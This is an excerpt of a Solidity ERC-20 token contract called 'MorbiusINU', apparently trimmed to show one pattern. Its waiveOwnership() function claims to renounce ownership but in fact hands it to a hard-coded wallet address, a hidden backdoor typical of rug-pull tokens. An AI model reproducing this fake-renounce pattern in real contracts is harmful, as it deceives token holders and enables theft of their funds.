...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x544965124844136AaDA4d67e841b4eB4742FE7F2);
    }
...
contract MorbiusINU is Context, IERC20, Ownable {
    ...
    string private _name = "MorbiusINU";
    string private _symbol = "MorbiusINU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x03Db3026b29a0cb57aa48c728fF9b2e6fdDCFaaf);
    address payable public teamWalletAddress = payable(0x13CD59836fFa190c3c5c834c7F5f4460bFABe77d);
